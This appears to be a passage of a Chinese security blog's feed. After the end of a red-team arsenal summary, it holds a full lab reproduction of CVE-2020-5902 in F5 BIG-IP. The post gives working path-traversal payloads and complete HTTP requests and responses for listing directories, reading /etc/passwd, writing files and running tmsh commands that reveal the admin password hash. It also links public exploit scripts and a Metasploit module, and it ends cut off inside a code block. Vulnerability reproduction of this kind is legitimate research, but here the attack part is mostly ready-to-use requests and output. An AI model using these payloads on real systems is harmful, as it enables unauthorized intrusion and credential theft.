&lt;p&gt;以下仅针对日常 “红队”场景,进行了一次相对全面完整的实战攻击利用技术提炼汇总，针对不同的渗透阶段,所可能会用到的一些技术都做了详尽梳理说明(后面可能还会整理出对应的完整工具链,虽然那不是最主要的),由于红队不同于一般的渗透测试,强调更多的是如何搞进去拿到相应机器权限或者实现某特定目的而不局限于你一定要在什么时间,用什么技术或者必须通过什么途径去搞&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="安全攻防" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="HW" scheme="http://yoursite.com/tags/HW/"/>
    
      <category term="攻防" scheme="http://yoursite.com/tags/%E6%94%BB%E9%98%B2/"/>
    
      <category term="红队" scheme="http://yoursite.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
      <category term="弹药库" scheme="http://yoursite.com/tags/%E5%BC%B9%E8%8D%AF%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-5902：F5 BIG-IP 远程代码执行漏洞复现</title>
    <link href="http://yoursite.com/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-07-11T10:55:17.000Z</published>
    <updated>2020-07-11T12:02:57.678Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2020-5902：F5-BIG-IP-远程代码执行漏洞复现"><a href="#CVE-2020-5902：F5-BIG-IP-远程代码执行漏洞复现" class="headerlink" title="CVE-2020-5902：F5 BIG-IP 远程代码执行漏洞复现"></a>CVE-2020-5902：F5 BIG-IP 远程代码执行漏洞复现</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>F5 BIG-IP 是美国F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。</p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>2020年7月1日，F5官方公布流量管理用户界面（TMUI）存在 前台远程执行代码（RCE）漏洞（CVE-2020-5902）。攻击者利用该漏洞，构造恶意请求，在未授权的情况下获得目标服务器的权限，实现远程代码执行。</p><p>未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 F5 BIG-IP的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。</p><a id="more"></a><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>BIG-IP 15.x: 15.1.0/15.0.0</li><li>BIG-IP 14.x: 14.1.0 ~ 14.1.2</li><li>BIG-IP 13.x: 13.1.0 ~ 13.1.3</li><li>BIG-IP 12.x: 12.1.0 ~ 12.1.5</li><li>BIG-IP 11.x: 11.6.1 ~ 11.6.5</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在登录页面注册：<code>https://www.f5.com.cn/trials/big-ip-virtual-edition</code></p><p>打开下载页面：<code>https://downloads.f5.com/esd/ecc.sv?sw=BIG-IP&amp;pro=big-ip_v15.x&amp;ver=15.1.0&amp;container=Virtual-Edition</code></p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt></p><p>使用vmware-workstation软件运行镜像文件</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt><br><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt></p><p>使用密码root/default登陆系统，第一次需要重置root密码，新密码为bigippass<br><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt></p><p>配置网卡信息，输入config，配置ip地址<br><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt></p><p>浏览器访问<code>https://192.168.1.245</code>，跳转如下图就说明好啦！</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt></p><p>使用admin/bigippass登录</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt></p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="Shodan批量扫描脚本"><a href="#Shodan批量扫描脚本" class="headerlink" title="Shodan批量扫描脚本"></a>Shodan批量扫描脚本</h3><p><code>https://github.com/aqhmal/CVE-2020-5902-Scanner</code></p><h3 id="Nmap扫描脚本"><a href="#Nmap扫描脚本" class="headerlink" title="Nmap扫描脚本"></a>Nmap扫描脚本</h3><p><code>https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve2020-5902.nse</code><br><code>poc:nmap --script http-vuln-cve2020-5902 -p443 192.168.1.245</code></p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><blockquote><p>Payload</p></blockquote><p><code>http/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/</code></p><blockquote><p>Request</p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=65ACC6C79B31335D71E4F432DB39EA50</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><blockquote><p>Response</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">     "dir": "tmui",</span><br><span class="line">     "children": [</span><br><span class="line">       &#123;</span><br><span class="line">         "dir": "WEB-INF",</span><br><span class="line">         "children": [</span><br><span class="line">           &#123;</span><br><span class="line">             "dir": "classes",</span><br><span class="line">             "children": [</span><br><span class="line">               &#123;</span><br><span class="line">                 "dir": "org",</span><br><span class="line">                 "children": [</span><br><span class="line">                   &#123;</span><br><span class="line">                     "dir": "apache",</span><br><span class="line">                     "children": [</span><br><span class="line">                       &#123;</span><br><span class="line">                         "dir": "jsp",</span><br><span class="line">                         "children": [</span><br><span class="line">                           &#123;</span><br><span class="line">                             "dir": "common",</span><br><span class="line">                             "children": [</span><br><span class="line">                               &#123;</span><br><span class="line">                                 "file": "deleteconfirm_jsp.class"</span><br><span class="line">  </span><br><span class="line">                                   ............................</span><br></pre></td></tr></table></figure><p>截图如下（复现失败，返回服务器内部错误500）</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt></p><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><blockquote><p>Payload</p></blockquote><p><code>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code></p><blockquote><p>Request</p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.245</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 8.8.8.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><blockquote><p>Response</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Fri, 10 Jul 2020 14:42:03 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache</span><br><span class="line"><span class="attribute">X-Frame-Options</span>: SAMEORIGIN</span><br><span class="line"><span class="attribute">Strict-Transport-Security</span>: max-age=16070400; includeSubDomains</span><br><span class="line"><span class="attribute">Set-Cookie</span>: JSESSIONID=08827183860922C1DCF8A89BB46E7839; Path=/tmui; Secure; HttpOnly</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html;charset=ISO-8859-1</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span>: nosniff</span><br><span class="line"><span class="attribute">X-XSS-Protection</span>: 1; mode=block</span><br><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'  'unsafe-inline' 'unsafe-eval' data: blob:; img-src 'self' data:  http://127.4.1.1 http://127.4.2.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 1916</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;"output":"root:x:0:0:root:\/root:\/bin\/bash\nbin:x:1:1:bin:\/bin:\/sbin\/nologin\ndaemon:x:2:2:daemon:\/sbin:\/sbin\/nologin\nadm:x:3:4:adm:\/var\/adm:\/sbin\/nologin\nlp:x:4:7:lp:\/var\/spool\/lpd:\/sbin\/nologin\nmail:x:8:12:mail:\/var\/spool\/mail:\/sbin\/nologin\noperator:x:11:0:operator:\/root:\/sbin\/nologin\nnobody:x:99:99:Nobody:\/:\/sbin\/nologin\ntmshnobody:x:32765:32765:tmshnobody:\/:\/sbin\/nologin\nadmin:x:0:500:Admin User:\/home\/admin:\/bin\/false\nsupport:x:0:0:support:\/root:\/bin\/bash\nf5emsvr:x:975:975:F5 EM Service Account:\/root:\/bin\/false\nvcsa:x:69:69:virtual console memory owner:\/dev:\/sbin\/nologin\ndbus:x:81:81:System message bus:\/:\/sbin\/nologin\nsystemd-bus-proxy:x:974:998:systemd Bus Proxy:\/:\/sbin\/nologin\nsystemd-network:x:192:192:systemd Network Management:\/:\/sbin\/nologin\npolkitd:x:27:27:User for polkitd:\/:\/sbin\/nologin\nnslcd:x:65:55:LDAP Client User:\/:\/sbin\/nologin\ntss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:\/dev\/null:\/sbin\/nologin\npostgres:x:26:26:PostgreSQL Server:\/var\/local\/pgsql\/data:\/sbin\/nologin\ntomcat:x:91:91:Apache Tomcat:\/usr\/share\/tomcat:\/sbin\/nologin\nhsqldb:x:96:96::\/var\/lib\/hsqldb:\/sbin\/nologin\nsshd:x:74:74:Privilege-separated SSH:\/var\/empty\/sshd:\/sbin\/nologin\nrpc:x:32:32:Rpcbind Daemon:\/var\/lib\/rpcbind:\/sbin\/nologin\nntp:x:38:38::\/etc\/ntp:\/sbin\/nologin\nf5_remoteuser:x:499:499:f5 remote user account:\/home\/f5_remoteuser:\/sbin\/nologin\ntcpdump:x:72:72::\/:\/sbin\/nologin\noprofile:x:16:16:Special user account to be used by OProfile:\/:\/sbin\/nologin\nsdm:x:191:996:sdmuser:\/var\/sdm:\/bin\/false\nnamed:x:25:25:Named:\/var\/named:\/bin\/false\napache:x:48:48:Apache:\/usr\/local\/www:\/sbin\/nologin\nsyscheck:x:199:10::\/:\/sbin\/nologin\nmysql:x:98:98:MySQL server:\/var\/lib\/mysql:\/sbin\/nologin\nrestnoded:x:198:198::\/:\/sbin\/nologin\n"&#125;</span><br></pre></td></tr></table></figure><p>漏洞截图如下</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt></p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt></p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><blockquote><p>Payload</p></blockquote><p><code>/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jspPOST: fileName=/tmp/1.txt&amp;content=CVE-2020-5902</code></p><blockquote><p>Request</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.245</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=472D937EAA86CEF84A8C1C5C6C5EEDBD;</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 8.8.8.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 41</span><br><span class="line"></span><br><span class="line">fileName=/tmp/1.txt&amp;content=CVE-2020-5902</span><br></pre></td></tr></table></figure><blockquote><p>Response</p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Fri, 10 Jul 2020 15:54:30 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache</span><br><span class="line"><span class="attribute">X-Frame-Options</span>: SAMEORIGIN</span><br><span class="line"><span class="attribute">Strict-Transport-Security</span>: max-age=16070400; includeSubDomains</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html;charset=ISO-8859-1</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span>: nosniff</span><br><span class="line"><span class="attribute">X-XSS-Protection</span>: 1; mode=block</span><br><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'  'unsafe-inline' 'unsafe-eval' data: blob:; img-src 'self' data:  http://127.4.1.1 http://127.4.2.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 4</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>截图如下</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt></p><p>读取上传文件</p><blockquote><p>Request</p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/1.txt</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.245</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=472D937EAA86CEF84A8C1C5C6C5EEDBD;</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 8.8.8.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><blockquote><p>Response</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Fri, 10 Jul 2020 15:57:50 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache</span><br><span class="line"><span class="attribute">X-Frame-Options</span>: SAMEORIGIN</span><br><span class="line"><span class="attribute">Strict-Transport-Security</span>: max-age=16070400; includeSubDomains</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html;charset=ISO-8859-1</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span>: nosniff</span><br><span class="line"><span class="attribute">X-XSS-Protection</span>: 1; mode=block</span><br><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'  'unsafe-inline' 'unsafe-eval' data: blob:; img-src 'self' data:  http://127.4.1.1 http://127.4.2.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 32</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;"output":"CVE-2020-5902\n"&#125;</span><br></pre></td></tr></table></figure><p>文件上传成功,截图如下</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt></p><h3 id="命令执行（RCE）"><a href="#命令执行（RCE）" class="headerlink" title="命令执行（RCE）"></a>命令执行（RCE）</h3><blockquote><p>Payload</p></blockquote><p><code>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</code></p><p><code>list auth user</code>  查看所有用户</p><p><code>list auth user admin</code>  查看管理员账户</p><blockquote><p>Request</p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.245</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 8.8.8.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><blockquote><p>Response</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Fri, 10 Jul 2020 15:47:16 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache</span><br><span class="line"><span class="attribute">X-Frame-Options</span>: SAMEORIGIN</span><br><span class="line"><span class="attribute">Strict-Transport-Security</span>: max-age=16070400; includeSubDomains</span><br><span class="line"><span class="attribute">Set-Cookie</span>: JSESSIONID=238233448C2CEE035A5902915FF0D73B; Path=/tmui; Secure; HttpOnly</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html;charset=ISO-8859-1</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span>: nosniff</span><br><span class="line"><span class="attribute">X-XSS-Protection</span>: 1; mode=block</span><br><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'  'unsafe-inline' 'unsafe-eval' data: blob:; img-src 'self' data:  http://127.4.1.1 http://127.4.2.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 341</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;"error":"","output":"auth user admin &#123;\n    description \"Admin User\"\n    encrypted-password $6$iae1LEWL$UHp47yM0TDm9ly5xMwixyNu8TTYNcFLrEplrdqiZ82eMzX3ISbjY3VEYIAmuT\/EK7ybt2GN..pyvZpBehnLI31\n    partition Common\n    partition-access &#123;\n        all-partitions &#123;\n            role admin\n        &#125;\n    &#125;\n    shell none\n&#125;\n"&#125;</span><br></pre></td></tr></table></figure><p>漏洞截图如下</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt></p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.png" alt></p><p><em>PS:执行返回500错误的时候多执行几次即可成功</em></p><p><strong>使用github python脚本工具执行命令</strong></p><p><code>https://github.com/jas502n/CVE-2020-5902</code></p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/16.png" alt></p><p>修改目标地址</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/17.png" alt></p><p>运行python脚本</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/18.png" alt></p><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>MSF f5_bigip_tmui_rce 漏洞利用脚本</p><p><code>https://github.com/rapid7/metasploit-framework/blob/0417e88ff24bf05b8874c953bd91600f10186ba4/modules/exploits/linux/http/f5_bigip_tmui_rce.rb</code></p><p><strong>msf use</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 